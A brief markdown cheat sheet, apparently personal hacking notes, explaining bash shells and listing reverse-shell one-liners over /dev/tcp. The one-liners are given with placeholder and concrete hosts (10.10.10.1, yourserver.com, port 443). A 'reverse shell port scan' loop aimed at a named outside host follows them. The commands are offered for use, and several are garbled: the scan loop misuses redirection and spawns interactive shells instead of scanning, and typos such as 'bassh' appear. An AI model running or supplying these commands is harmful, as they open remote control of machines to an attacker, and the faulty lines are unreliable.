# Shells

>  A shell is software/protocol that provides an interface for an CLI to the underlying OS


### BASH

Bash as it stands, is a (the most popular) shell on its own, but can also provide some really neat tricks to allow for all kinds of shell related goodness, such as a reverse shell.

#### Bash reverse shell

* Spawn a reverse shell back to your server using /dev/tcp 
    > bash -i >& /dev/tcp/<yourserver>/8080 0>&1 
            > e.g  bash -i >& /dev/tcp/10.10.10.1/8080 0>&1
    >  
    > or bassh -c bash -i >& /dev/tcp/<yourserver>/8080 0>&1 
            > e.g bash -i >& /dev/tcp/yourserver.com/443 0>&1
    >  

#### Bash reverse shell port scan

* Using /dev/tcp to do a reverse shell port scan, useful for checking allowed hosts
    > Example looking for open web connection on a remote host when no port scammer is available:
        >  
        > for port in {21..443}; do echo -e "GET / HTTP/1.0\n\n" > bash -i >& /dev/tcp/cr8tiv.space/$port 0>&1 && echo -e "\n[$port is UP]\n"; done
        >  

